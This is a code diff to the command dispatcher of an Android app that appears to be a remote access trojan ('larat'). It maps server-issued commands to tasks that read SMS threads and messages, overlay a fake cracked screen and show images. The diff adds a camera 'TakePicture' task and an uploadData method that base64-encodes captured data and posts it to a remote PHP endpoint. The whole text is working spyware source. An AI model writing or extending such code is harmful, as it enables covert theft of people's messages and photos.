@@ -1,6 +1,7 @@
 package com.c4wd.commands;
 
 import android.os.AsyncTask;
+import android.util.Base64;
 
 import com.c4wd.larat.Constants;
 import com.c4wd.larat.RestClient;
@@ -29,15 +30,20 @@ public class Command {
             commandList.put("SetLocationInterval", GenericTasks.SetLocationIntervalTask.class);
             commandList.put("Toast", GenericTasks.ToastTask.class);
             //drawing tasks
+
             commandList.put("OpenGL", DrawingTasks.OpenGLViewTask.class);
             commandList.put("Pong", DrawingTasks.PongTask.class);
             commandList.put("ScreenCrack", DrawingTasks.CrackScreenTask.class);
             commandList.put("ClearViews", DrawingTasks.ClearViewTask.class);
             commandList.put("ShowImage", DrawingTasks.DrawURLImage.class);
             //sms tasks
-            commandList.put("CacheThread", SMSCommands.CacheThreadIdTask.class);
-            commandList.put("GetMessages", SMSCommands.GetMessagesTask.class);
-            commandList.put("GetThreads", SMSCommands.GetThreadsTask.class);
+
+            commandList.put("CacheThread", SMSTasks.CacheThreadIdTask.class);
+            commandList.put("GetMessages", SMSTasks.GetMessagesTask.class);
+            commandList.put("GetThreads", SMSTasks.GetThreadsTask.class);
+            //camera tasks
+
+            commandList.put("TakePicture", CameraTasks.TakePictureTask.class);
         }
     }
 
@@ -56,6 +62,15 @@ public class Command {
         params.put("client_id", Constants.CLIENT_ID);
         params.put("message_type", "WARNING");
         params.put("message", result);
+        RestClient.post("client_command.php", params);
+    }
+
+    public static void uploadData(byte[] data, String tag) {
+        RequestParams params = new RequestParams();
+        params.put("command", "file_upload");
+        params.put("client_id", Constants.CLIENT_ID);
+        params.put("message_type", tag);
+        params.put("message", Base64.encodeToString(data, Base64.DEFAULT));
         RestClient.post("client_command.php", params);
     }
 }
